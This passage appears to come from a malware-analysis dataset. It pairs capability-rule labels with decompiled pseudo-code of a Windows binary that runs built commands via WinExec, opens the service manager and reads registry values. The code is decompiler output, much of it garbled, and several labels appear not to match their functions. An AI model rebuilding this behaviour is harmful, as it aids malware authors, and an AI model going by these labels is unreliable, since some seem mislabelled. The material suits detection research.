*puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407398;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402c20(auStack1564, 0x4072f4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00402630": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402630(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint16_t unaff_BX;\n    uint8_t unaff_DI;\n    bool bVar5;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar3 = 1;\n        do {\n            uVar1 = *(iVar3 % arg_ch + arg_8h);\n            uVar2 = *(var_8h + arg_10h) ^ *((iVar3 + -1) % arg_ch + arg_8h);\n            bVar5 = (arg_ch | 0x2fff) - unaff_BX != 0x7174;\n            if ((bVar5) && (!bVar5)) {\n                uVar2 = unaff_DI;\n            }\n            uVar4 = arg_14h * '\\x02';\n            uVar2 = uVar4 ^ uVar2;\n            unaff_BX = unaff_BX & 0xff00 | uVar2;\n            *(arg_18h + -1 + iVar3) = uVar2;\n            *(iVar3 + arg_18h) = uVar4 ^ uVar1;\n            var_8h = var_8h + 1;\n            iVar3 = iVar3 + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00403870": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403c76) overlaps instruction at (ram,0x00403c75)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403b1b)\n// WARNING: Removing unreachable block (ram,0x00403c50)\n\nuint __fastcall fcn.00403870(uint param_1, uint8_t param_2)\n\n{\n    uint16_t uVar1;\n    ushort uVar2;\n    char extraout_AH_00;\n    ushort uVar3;\n    uint uVar4;\n    uint8_t extraout_AH;\n    uint32_t uVar5;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    char extraout_CH_00;\n    int32_t extraout_ECX_06;\n    uint extraout_ECX_07;\n    int32_t extraout_ECX_08;\n    int32_t extraout_ECX_09;\n    uint extraout_ECX_10;\n    char cVar6;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    int32_t *piVar7;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    int32_t iVar8;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t unaff_EBX;\n    uint uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint32_t *puVar17;\n    uint32_t *puVar18;\n    uint32_t *puVar19;\n    uint *puVar20;\n    uint unaff_EBP;\n    uint32_t uVar21;\n    uint *puVar22;\n    uint *puVar23;\n    ushort uVar24;\n    uint unaff_EDI;\n    uint uVar25;\n    uchar *puVar26;\n    uchar *puVar27;\n    uint *puVar28;\n    uint *puVar29;\n    char *pcVar30;\n    ushort in_ES;\n    uchar uVar31;\n    bool bVar32;\n    uint8_t in_AF;\n    bool bVar33;\n    char cVar34;\n    char cVar35;\n    unkbyte10 extraout_ST0;\n    ulong uVar36;\n    ulong uVar37;\n    unkbyte6 Var38;\n    uint uStack24;\n    uint uStack20;\n    \n    bVar32 = (POPCOUNT(param_1 >> 8 | param_2 | 0x1f) & 1U) == 0;\n    uStack20 = 0x407038;\n    uStack24 = 0x12;\n    uVar36 = fcn.00403740(0x407010);\n    iVar8 = uVar36 >> 0x20;\n    cVar34 = extraout_CH;\n    if ((bVar32) || (!bVar32)) {\ncode_r0x004038b0:\n        *(iVar8 + 0x12) = *(iVar8 + 0x12) + cVar34;\n        fcn.00403740(0x407010);\n        uStack20 = 0x407058;\n        uStack24 = 0x12;\n        fcn.00403740(0x407010);\n    }\n    else {\n        unaff_EBP = *0x6a17b43a;\n        pcVar30 = iVar8 + 0x45;\n        cVar34 = extraout_CH + *pcVar30;\n        iVar8 = uVar36;\n        if (SCARRY1(extraout_CH, *pcVar30) == SCARRY1(cVar34, '\\0')) goto code_r0x004038b0;\n    }\n    uStack20 = 0x40705c;\n    uStack24 = 0x12;\n    fcn.00403740(0x407010);\n    fcn.00403740(0x407010, 0x12, 0x407068, 7);\n    uStack20 = 0x12;\n    uStack24 = 0x407010;\n    fcn.00403740();\n    uStack20 = 0x12;\n    uStack24 = 0x407010;\n    fcn.00403740();\n    uStack20 = 0x12;\n    uStack24 = 0x407010;\n    fcn.00403740();\n    uStack20 = 0x12;\n    uStack24 = 0x407010;\n    uVar1 = fcn.00403740();\n    uVar1 = (uVar1 & 0xff | ((uVar1 >> 8) - unaff_EBX) + 0x4d << 8) & 0x26ae;\n    cVar35 = SBORROW2(uVar1, 1);\n    cVar34 = uVar1 - 1 < 0;\n    uStack20 = 0x12;\n    uStack24 = 0x407010;\n    uVar36 = fcn.00403740();\n    if ((cVar35 != cVar34) || (cVar6 = (extraout_ECX << 0x10) >> 0x18,  cVar35 == cVar34)) {\n        cVar6 = extraout_ECX >> 8;\n    }\n    puVar11 = &stack0xffffffe8 ^ *(unaff_EBX + 0x6a);\n    pcVar30 = (uVar36 >> 0x20) + 0x12;\n    *pcVar30 = *pcVar30 + cVar6;\n    puVar11[-1] = 0x407010;\n    puVar11[-2] = 0x403a2f;\n    uVar37 = fcn.00403740();\n    puVar11[6] = uVar37;\n    puVar11[5] = extraout_ECX_00;\n    puVar11[4] = uVar37 >> 0x20;\n    puVar11[3] = unaff_EBX;\n    puVar11[2] = puVar11 + 7;\n    puVar11[1] = unaff_EBP;\n    *puVar11 = uVar36;\n    puVar11[-1] = unaff_EDI;\n    uVar25 = puVar11[-1];\n    puVar22 = *puVar11;\n    uVar21 = puVar11[1];\n    uVar9 = puVar11[3];\n    puVar11[6] = 10;\n    puVar11[5] = 0x4070e0;\n    puVar11[4] = 0x12;\n    puVar11[3] = 0x407010;\n    puVar11[2] = 0x403a53;\n    uVar4 = fcn.00403740();\n    puVar11[6] = uVar4;\n    puVar11[5] = uVar25;\n    puVar26 = puVar11[5];\n    puVar11[6] = 0xc;\n    puVar11[5] = 0x4070ec;\n    puVar11[4] = 0x12;\n    puVar11[3] = 0x407010;\n    puVar11[2] = 0x403a8a;\n    fcn.00403740();\n    puVar11[6] = uVar9;\n    puVar11[5] = extraout_ECX_01;\n    bVar32 = false;\n    bVar33 = ((uVar9 & 0xff00 | uVar9 | extraout_AH) & 0x94f) == 0;\n    uVar10 = puVar11[6];\n    puVar11[6] = 0xd;\n    puVar11[5] = 0x4070f8;\n    puVar11[4] = 0x12;\n    puVar11[3] = 0x407010;\n    puVar11[2] = 0x403ab6;\n    cVar34 = '\\0';\n    uVar5 = fcn.00403740();\n    if ((bVar33) || (!bVar33)) {\ncode_r0x00403aca:\n        puVar11[2] = 6;\n        puVar11[1] = 0x407108;\n        *puVar11 = 0x12;\n        puVar11[-1] = 0x407010;\n        puVar11[-2] = 0x403add;\n        uVar36 = fcn.00403740();\n        puVar11[6] = uVar36;\n        puVar11[5] = extraout_ECX_02;\n        puVar11[4] = uVar36 >> 0x20;\n        puVar11[3] = uVar10;\n        puVar11[2] = puVar11 + 7;\n        puVar11[1] = uVar21;\n        *puVar11 = puVar22;\n        puVar11[-1] = puVar26;\n        cVar35 = '\\0';\n        cVar34 = '\\0';\n        puVar27 = puVar11[-1];\n        puVar22 = *puVar11;\n        uVar21 = puVar11[1];\n        uVar10 = puVar11[3];\n        puVar11[6] = 5;\n        puVar11[5] = 0x407110;\n        puVar11[4] = 0x12;\n        puVar11[3] = 0x407010;\n        puVar11[2] = 0x403afb;\n        uVar5 = fcn.00403740();\n        if (cVar35 == cVar34) {\n            puVar11[2] = puVar27;\n            puVar27 = puVar11[2];\n            if (cVar35 != cVar34) {\n                *(puVar11 + 3) = in_ES;\n                cVar34 = -0xc;\n                puVar22 = puVar22 + -1;\n                puVar26 = puVar27 | uVar21;\n                goto code_r0x00403b0f;\n            }\n        }\n    }\n    else {\n        uVar10 = uVar10 + 1;\n        if (!bVar32 && uVar10 != 0) {\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            piVar7 = (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar7 = *piVar7 - uVar10;\n            puVar22 = puVar22 + 1;\n            goto code_r0x00403aca;\n        }\ncode_r0x00403b0f:\n        puVar27 = puVar26 + 1;\n        *puVar26 = uVar5;\n        cVar35 = SBORROW1(cVar34, cVar34);\n        cVar34 = '\\0';\n    }\n    puVar11[2] = 0xd;\n    puVar11[1] = 0x407118;\n    *puVar11 = 0x12;\n    puVar12 = puVar11 + -1;\n    puVar11[-1] = 0x407010;\n    puVar11[-2] = 0x403b29;\n    uVar36 = fcn.00403740();\n    piVar7 = uVar36 >> 0x20;\n    if ((cVar35 != cVar34) || (cVar35 == cVar34)) {\n        puVar12 = puVar11 + -2;\n        puVar11[-2] = 0x19;\n    }\n    *(uVar36 + -0x7ce92414) = extraout_ST0;\n    *(puVar12 + -4) = uVar10;\n    *piVar7 = *piVar7 + 0x196adf84;\n    *(puVar12 + -8) = 0x407128;\n    *(puVar12 + -0xc) = 0x12;\n    *(puVar12 + -0x10) = 0x407010;\n    *(puVar12 + -0x14) = 0x403b51;\n    fcn.00403740();\n    *(puVar12 + 0x1c) = extraout_ECX_03;\n    *(puVar12 + 0x18) = extraout_EDX;\n    *(puVar12 + 0x1c) = 0xf;\n    *(puVar12 + 0x18) = 0x407144;\n    *(puVar12 + 0x14) = 0x12;\n    *(puVar12 + 0x10) = 0x407010;\n    *(puVar12 + 0xc) = 0x403b86;\n    fcn.00403740();\n    *(puVar12 + 0x1c) = extraout_EDX_00;\n    *(puVar12 + 0x18) = puVar27;\n    uVar31 = 0;\n    bVar32 = false;\n    puVar28 = *(puVar12 + 0x18);\n    *(puVar12 + 0x1c) = 0xe;\n    *(puVar12 + 0x18) = 0x407154;\n    *(puVar12 + 0x14) = 0x12;\n    puVar13 = puVar12 + 0x10;\n    puVar14 = puVar12 + 0x10;\n    *(puVar12 + 0x10) = 0x407010;\n    *(puVar12 + 0xc) = 0x403ba8;\n    uVar36 = fcn.00403740();\n    iVar8 = uVar36 >> 0x20;\n    uVar4 = extraout_ECX_04;\n    if (bVar32) {\ncode_r0x00403bb6:\n        cVar34 = uVar4 >> 8;\n        *(puVar12 + 0xc) = 0xb;\n        *(puVar12 + 8) = 0x407164;\n        puVar13 = puVar12 + 4;\n        *(puVar12 + 4) = 0x12;\ncode_r0x00403bbc:\n        *(iVar8 + 0x12) = *(iVar8 + 0x12) + cVar34;\n        *(puVar13 + -4) = 0x407010;\n        *(puVar13 + -8) = 0x403bc9;\n        fcn.00403740();\n        *(puVar13 + 0x18) = uVar10;\n        uVar5 = *(puVar13 + 0x18);\n        *(puVar13 + 0x18) = 0xb;\n        *(puVar13 + 0x14) = 0x407170;\n        *(puVar13 + 0x10) = 0x12;\n        *(puVar13 + 0xc) = 0x407010;\n        *(puVar13 + 8) = 0x403bec;\n        uVar2 = fcn.00403740();\n        *(puVar13 + 0x1a) = uVar2;\n        *(puVar13 + 0x18) = extraout_ECX_05;\n        *(puVar13 + 0x16) = extraout_DX;\n        *(puVar13 + 0x14) = uVar5;\n        *(puVar13 + 0x12) = puVar13 + 0x1c;\n        *(puVar13 + 0x10) = uVar21;\n        *(puVar13 + 0xe) = puVar22;\n        *(puVar13 + 0xc) = puVar28;\n        *(puVar13 + 8) = extraout_ECX_05;\n        uVar31 = 0;\n        bVar32 = (extraout_ECX_05 >> 8 | 0x47) == 0;\n        puVar29 = puVar28 & 0xffff0000 | *(puVar13 + 0xc);\n        puVar23 = puVar22 & 0xffff0000 | *(puVar13 + 0xe);\n        uVar21 = uVar21 & 0xffff0000 | *(puVar13 + 0x10);\n        uVar10 = uVar5 & 0xffff0000 | *(puVar13 + 0x14);\n        puVar14 = puVar13 + 0x18;\n        *(puVar13 + 0x18) = 0xb;\n    }\n    else {\n        *(puVar12 + 0xc) = extraout_ECX_04;\n        uVar4 = *(puVar12 + 0xc);\n        cVar34 = uVar4 >> 8;\n        if (!bVar32) goto code_r0x00403bb6;\n        bVar32 = uVar36 == -1;\n        puVar29 = puVar28 + 1;\n        puVar23 = puVar22 + 1;\n        *puVar28 = *puVar22;\n        iVar8 = 0x64680b6a;\n        puVar22 = puVar23;\n        puVar28 = puVar29;\n        if (SCARRY4(uVar36, 1)) goto code_r0x00403bbc;\n    }\n    *(puVar14 + -4) = 0x40717c;\n    *(puVar14 + -8) = 0x12;\n    puVar15 = puVar14 + -0xc;\n    *(puVar14 + -0xc) = 0x407010;\n    *(puVar14 + -0x10) = 0x403c0d;\n    fcn.00403740();\n    if ((uVar31 || bVar32) || (!uVar31 && !bVar32)) {\n        *(puVar14 + -0x10) = 10;\n        *(puVar14 + -0x14) = 0x407188;\n        *(puVar14 + -0x18) = 0x12;\n        pcVar30 = extraout_EDX_01 + 0x12;\n        cVar35 = SCARRY1(*pcVar30, extraout_CH_00);\n        *pcVar30 = *pcVar30 + extraout_CH_00;\n        cVar34 = *pcVar30 < '\\0';\n        uVar31 = *pcVar30 == '\\0';\n        *(puVar14 + -0x1c) = 0x407010;\n        *(puVar14 + -0x20) = 0x403c30;\n        uVar2 = fcn.00403740();\n        if (cVar35 == cVar34) {\n            *(puVar14 + -0x20) = puVar29;\n            puVar29 = *(puVar14 + -0x20);\n            if (cVar35 != cVar34) {\n                *(puVar14 + -0x1c) = in_ES;\n                puVar23 = puVar23 + -1;\n                pcVar30 = puVar29 | uVar21;\n                puVar29 = pcVar30 + 1;\n                *pcVar30 = uVar2;\n                cVar35 = '\\0';\n                cVar34 = '\\0';\n                uVar31 = uVar2 + (uVar2 >> 8) * 'y' == '\\0';\n            }\n        }\n        uVar2 = SUB42(puVar23, 0);\n        *(puVar14 + -0x20) = 0xc;\n        *(puVar14 + -0x24) = 0x407194;\n        *(puVar14 + -0x28) = 0x12;\n        puVar16 = puVar14 + -0x2c;\n        *(puVar14 + -0x2c) = 0x407010;\n        *(puVar14 + -0x30) = 0x403c5e;\n        fcn.00403740();\n        if (!uVar31 && cVar35 == cVar34) {\n            puVar15 = puVar14 + -0x2e;\n            *(puVar14 + -0x2e) = uVar2;\n            goto code_r0x00403c66;\n        }\n    }\n    else {\n        *(puVar29 + 0x6a) = *(puVar29 + 0x6a) - (puVar14 + -0xc);\n        *(puVar23 + 0x56) = *(puVar23 + 0x56) + extraout_AH_00;\ncode_r0x00403c66:\n        uVar2 = *puVar15;\n        puVar16 = puVar15 + 1;\n    }\n    *(puVar16 + -4) = 0xe;\n    *(puVar16 + -8) = 0x4071a0;\n    *(puVar16 + -0xc) = 0x12;\n    *(puVar16 + -0x10) = 0x407010;\n    *(puVar16 + -0x14) = 0x403c81;\n    fcn.00403740();\n    puVar17 = puVar16 + 0x2c;\n    *(puVar16 + 0x2c) = uVar10;\n    while( true ) {\n        uVar24 = SUB42(puVar29, 0);\n        bVar32 = 0xcf < uVar10 >> 8;\n        uVar10 = *puVar17;\n        *puVar17 = 0x11;\n        puVar17[-1] = 0x4071b0;\n        puVar17[-2] = 0x12;\n        puVar18 = puVar17 + -3;\n        puVar19 = puVar17 + -3;\n        puVar17[-3] = 0x407010;\n        puVar17[-4] = 0x403ca4;\n        puVar22 = fcn.00403740();\n        if (bVar32) break;\n        *(puVar17 + -0xe) = uVar24;\n        uVar24 = *(puVar17 + -0xe);\n        iVar8 = extraout_ECX_06;\n        if (!bVar32) break;\n        do {\n            bVar32 = puVar18 < *puVar22;\n            puVar17 = puVar18 + -4;\n            *(puVar18 + -4) = 0xb7f8c08b;\n            if (bVar32 || puVar22 + 1 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            pcVar30 = puVar22 + 0x11;\n            cVar35 = iVar8 >> 8;\n            cVar34 = cVar35 + *pcVar30;\n            iVar8 = cVar34 + bVar32 << 8;\n            puVar22 = puVar22 + 1;\n            puVar18 = puVar18 + -4;\n        } while (SCARRY1(cVar35, *pcVar30) != SCARRY1(cVar34, bVar32));\n        puVar29 = 0x83fffffa;\n    }\n    puVar17[-4] = 0x13;\n    puVar17[-5] = 0x4071c4;\n    puVar17[-6] = 0x12;\n    puVar17[-7] = 0x407010;\n    puVar17[-8] = 0x403cdc;\n    uVar3 = fcn.00403740();\n    *(puVar17 + 2) = uVar3;\n    *puVar17 = extraout_ECX_07;\n    *(puVar17 + -2) = extraout_DX_00;\n    *(puVar17 + -1) = uVar10;\n    *(puVar17 + -6) = puVar17 + 4;\n    *(puVar17 + -2) = uVar21;\n    *(puVar17 + -10) = uVar2;\n    *(puVar17 + -3) = uVar24;\n    puVar17[-4] = extraout_ECX_07;\n    bVar32 = (POPCOUNT(extraout_ECX_07 >> 8 | 0x47) & 1U) == 0;\n    uVar1 = *(puVar17 + -10);\n    puVar22 = uVar21 & 0xffff0000 | *(puVar17 + -2);\n    *puVar17 = 0x14;\n    puVar17[-1] = 0x4071d8;\n    puVar17[-2] = 0x12;\n    puVar17[-3] = 0x407010;\n    puVar17[-4] = 0x403cfd;\n    fcn.00403740();\n    iVar8 = extraout_ECX_08;\n    if (bVar32) {\ncode_r0x00403d09:\n        puVar17[-4] = 0x33;\n        puVar17[-5] = 0x4071ec;\n        puVar19 = puVar17 + -6;\n        puVar17[-6] = 0x12;\ncode_r0x00403d0f:\n        *(extraout_EDX_02 + 0x12) = *(extraout_EDX_02 + 0x12) + (iVar8 >> 8);\n        *(puVar19 + -4) = 0x407010;\n        *(puVar19 + -8) = 0x403d1c;\n        Var38 = fcn.00403740();\n        *(puVar19 + 0x1a) = Var38 >> 0x20;\n        *(puVar19 + 0x16) = Var38;\n        cVar6 = Var38 >> 0x20;\n        cVar35 = SBORROW1(cVar6, 'Q');\n        cVar34 = cVar6 + -0x51 < '\\0';\n        bVar32 = cVar6 == 'Q';\n        *(puVar19 + 0x18) = 10;\n        *(puVar19 + 0x14) = 0x407220;\n        *(puVar19 + 0x10) = 0x12;\n        puVar20 = puVar19 + 0xc;\n        *(puVar19 + 0xc) = 0x407010;\n        *(puVar19 + 8) = 0x403d47;\n        fcn.00403740();\n        iVar8 = extraout_ECX_09;\n        puVar18 = puVar19 + 0xc;\n        if (bVar32 || cVar35 != cVar34) goto code_r0x00403d59;\n    }\n    else {\n        puVar17[-4] = extraout_ECX_08;\n        iVar8 = puVar17[-4];\n        if (!bVar32) goto code_r0x00403d09;\n        piVar7 = extraout_EDX_02 + 0x33;\n        cVar35 = SBORROW4(*piVar7, 0x68);\n        *piVar7 = *piVar7 + -0x68;\n        cVar34 = *piVar7 < 0;\n        bVar32 = *piVar7 == 0;\n        in(extraout_EDX_02);\n        puVar18 = puVar17 + -3;\n        if (cVar35) goto code_r0x00403d0f;\n    }\n    puVar20 = puVar18;\n    if (bVar32 || cVar35 != cVar34) {\n        if (iVar8 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\ncode_r0x00403d59:\n    puVar20[-1] = 4;\n    puVar20[-2] = 0x40722c;\n    puVar20[-3] = 0x12;\n    puVar20[-4] = 0x407010;\n    puVar20[-5] = 0x403d6c;\n    fcn.00403740();\n    puVar20[3] = extraout_ECX_10;\n    *(puVar20 + 10) = extraout_DX_01;\n    puVar20[3] = 5;\n    puVar20[2] = 0x407230;\n    puVar20[1] = 0x12;\n    *puVar20 = 0x407010;\n    puVar20[-1] = 0x403d96;\n    Var38 = fcn.00403740();\n    puVar20[3] = Var38;\n    *(puVar20 + 10) = Var38 >> 0x20;\n    puVar20[3] = 6;\n    puVar20[2] = 0x407238;\n    puVar20[1] = 0x12;\n    *puVar20 = 0x407010;\n    puVar20[-1] = 0x403db3;\n    uVar5 = fcn.00403740();\n    puVar20[3] = uVar5;\n    bVar32 = (POPCOUNT(uVar1 & uVar5 & 0xff) & 1U) == 0;\n    puVar20[3] = 0x2a;\n    puVar20[2] = 0x40726c;\n    puVar20[1] = 0x12;\n    *puVar20 = 0x407010;\n    puVar20[-1] = 0x403dd4;\n    fcn.00403740();\n    if ((!bVar32) && (bVar32)) {\n        puVar28 = puVar20 + -1;\n        puVar20[-1] = puVar22;\n        cVar34 = '\\x1e';\n        do {\n            puVar22 = puVar22 + -1;\n            puVar28 = puVar28 + -1;\n            *puVar28 = *puVar22;\n            cVar34 = cVar34 + -1;\n        } while ('\\0' < cVar34);\n        puVar20[-0x20] = puVar20 + -1;\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    puVar20[-1] = 0xb;\n    puVar20[-2] = 0x407298;\n    puVar20[-3] = 0x12;\n    puVar20[-4] = 0x407010;\n    puVar20[-5] = 0x403e03;\n    uVar4 = fcn.00403740();\n    return uVar4;\n}\n",
        "token_count": 6906
    },
    "004048c0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048c0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0x3f);\n    uVar1 = fcn.00402580(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00401530": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004015ed) overlaps instruction at (ram,0x004015ec)\n// \n\nbool fcn.00401530(void)\n\n{\n    uint uVar1;\n    uchar extraout_CL;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    unkbyte6 Var8;\n    uchar uVar9;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint *puStack288;\n    uchar *puStack284;\n    uint *puStack280;\n    uchar pvData;\n    uint var_10bh;\n    uint auStack24 [3];\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar6 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puStack280 = &pcbData;\n    puStack284 = &pvData;\n    puStack288 = &pdwType;\n    uStack292 = 0x40749c;\n    uStack296 = 0x407474;\n    uStack300 = 0x80000002;\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar3 != 0) {\n        return false;\n    }\n    uVar9 = 0;\n    Var8 = (*_sym.imp.MSVCRT.dll_strchr)();\n    bVar7 = Var8 == NULL;\n    if (bVar7) {\n        return false;\n    }\n    if (!bVar7) {\n        uVar9 = puVar6 + 3 >> 0x18;\n        if (bVar7) {\n            uVar1 = in(Var8 >> 0x20);\n            *(puVar6 + 3) = uVar1;\n            if (&uStack300 < 1) {\n                auStack24[0] = 0x407454;\n                auStack24[1] = 0x40744c;\n                auStack24[2] = 0x40745c;\n                pdwType = 0x407464;\n                pcbData = 0x40746c;\n                uVar4 = 0;\n                puVar5 = auStack24;\n                do {\n                    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(puVar6 + 7, *puVar5);\n                    if (iVar3 != 0) {\n                        return true;\n                    }\n                    uVar4 = uVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                } while (uVar4 < 5);\n                iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(puVar6 + 7, 0x44);\n                return iVar3 == 0;\n            }\n            *0xdee00010 = *0xdee00010 + '\\x10';\n            uVar2 = extraout_CL;\n            goto code_r0x004015f6;\n        }\n    }\n    uVar2 = 0xf0;\n    *Var8 = 0;\ncode_r0x004015f6:\n    iVar3 = (*_sym.imp.MSVCRT.dll_atoi)(uVar2, uVar9);\n    if (iVar3 == 6) {\n        return true;\n    }\n    return iVar3 == 7;\n}\n",
        "token_count": 814
    },
    "00402790": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027bc)\n// WARNING: Removing unreachable block (ram,0x004027c5)\n// WARNING: Removing unreachable block (ram,0x004027c9)\n\nbool __cdecl fcn.00402790(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402900();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403350();\n        arg_ch_01 = fcn.00403350();\n        arg_ch_02 = fcn.00403350();\n        fcn.00401f50(arg_10h, arg_ch_00);\n        fcn.00401f50(arg_8h, arg_ch_01);\n        fcn.00401f50(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407038, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402740(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407044, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402740(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407044, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402740(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401f50(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 656
    },
    "00403e10": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
